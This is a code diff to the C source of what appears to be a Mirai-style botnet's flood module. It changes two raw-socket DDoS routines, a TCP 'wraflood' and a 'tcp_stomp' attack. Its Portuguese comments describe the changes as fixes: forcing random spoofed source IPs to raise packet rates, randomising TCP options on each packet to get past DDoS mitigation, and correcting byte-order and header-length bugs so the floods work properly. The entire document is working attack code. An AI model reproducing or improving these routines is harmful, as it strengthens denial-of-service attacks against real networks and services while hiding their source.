@@ -288,7 +288,8 @@ void attack_wraflood(uint8_t targs_len, struct attack_target *targs, uint8_t opt
     BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, TRUE);
     BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
     BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, FALSE);
-    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
+    // FIX: default para 0xffffffff para forçar IP spoof e gerar PPS real
+    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, 0xffffffff);
     if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
     {
         return;
@@ -324,25 +325,13 @@ void attack_wraflood(uint8_t targs_len, struct attack_target *targs, uint8_t opt
         iph->daddr = targs[i].addr;
         tcph->source = htons(sport);
         tcph->dest = htons(dport);
-        tcph->seq = htons(seq);
+        tcph->seq = htonl(seq);
         tcph->urg = urg_fl;
         tcph->ack = ack_fl;
         tcph->psh = psh_fl;
         tcph->rst = rst_fl;
         tcph->syn = syn_fl;
         tcph->fin = fin_fl;
-        int windows[11] = {29200, 64240, 65535, 32855, 18783, 30201, 35902, 28400, 8192, 6230, 65320};
-        char vals[] = "\x02\x04\x05\x14\x01\x03\x03\x07\x01\x01\x08\x0a\x32\xb7\x31\x58\x00\x00\x00\x00\x04\x02\x00\x00";
-        int mssvalues[9] = {20, 52, 160, 180, 172, 19, 109, 59, 113};
-        vals[3] = mssvalues[rand_next() % 9];
-        vals[7] = rand_next() % 6 + 6;
-        vals[12] = rand_next() % 250 + 1;
-        vals[13] = rand_next() % 250 + 1;
-        vals[14] = rand_next() % 250 + 1;
-        vals[15] = rand_next() % 250 + 1;
-        tcph->window = htons(windows[rand_next() % 11]);
-        const char *newpayload = vals;
-        memcpy((void *)tcph + sizeof(struct tcphdr), newpayload, 24);
         tcph->doff = ((sizeof (struct tcphdr)) + 24)/4;
     }
     while (TRUE)
@@ -352,10 +341,23 @@ void attack_wraflood(uint8_t targs_len, struct attack_target *targs, uint8_t opt
             char *pkt = pkts[i];
             struct iphdr *iph = (struct iphdr *)pkt;
             struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
+            // FIX: randomiza TCP options a cada pacote para bypass de mitigação
+            int windows[11] = {29200, 64240, 65535, 32855, 18783, 30201, 35902, 28400, 8192, 6230, 65320};
+            char vals[] = "\x02\x04\x05\x14\x01\x03\x03\x07\x01\x01\x08\x0a\x32\xb7\x31\x58\x00\x00\x00\x00\x04\x02\x00\x00";
+            int mssvalues[9] = {20, 52, 160, 180, 172, 19, 109, 59, 113};
+            vals[3] = mssvalues[rand_next() % 9];
+            vals[7] = rand_next() % 6 + 6;
+            vals[12] = rand_next() % 250 + 1;
+            vals[13] = rand_next() % 250 + 1;
+            vals[14] = rand_next() % 250 + 1;
+            vals[15] = rand_next() % 250 + 1;
+            tcph->window = htons(windows[rand_next() % 11]);
+            memcpy((void *)tcph + sizeof(struct tcphdr), vals, 24);
+
             if (targs[i].netmask < 32)
                 iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
-            if (source_ip == 0xffffffff)
-                iph->saddr = (rand_next() >> 24 & 0xFF) << 24 | (rand_next() >> 16 & 0xFF) << 16 | (rand_next() >> 8 & 0xFF) << 8 | (rand_next() & 0xFF);
+            // FIX: sempre randomiza IP source (era só quando == 0xffffffff)
+            iph->saddr = (rand_next() >> 24 & 0xFF) << 24 | (rand_next() >> 16 & 0xFF) << 16 | (rand_next() >> 8 & 0xFF) << 8 | (rand_next() & 0xFF);
             if (ip_ident == 0xffff)
                 iph->id = rand_next() & 0xffff;
             if (sport == 0xffff)
@@ -1069,11 +1071,9 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
 
                         tcph->source = stomp_data[i].sport;
                         tcph->dest = stomp_data[i].dport;
-                        tcph->seq = stomp_data[i].ack_seq;
-                        tcph->ack_seq = stomp_data[i].seq;
-                        tcph->doff = 8;
-                        tcph->fin = TRUE;
-                        tcph->ack = TRUE;
+                        tcph->seq = htonl(stomp_data[i].ack_seq);
+                        tcph->ack_seq = htonl(stomp_data[i].seq + 1);
+                        tcph->doff = 5; // FIX: era 8 mas não tem TCP options
                         tcph->window = rand_next() & 0xffff;
                         tcph->urg = urg_fl;
                         tcph->ack = ack_fl;
@@ -1123,8 +1123,8 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
             iph->check = 0;
             iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
 
-            tcph->seq = htons(stomp_data[i].seq++);
-            tcph->ack_seq = htons(stomp_data[i].ack_seq);
+            tcph->seq = htonl(stomp_data[i].seq++);
+            tcph->ack_seq = htonl(stomp_data[i].ack_seq);
             tcph->check = 0;
             tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len);
 
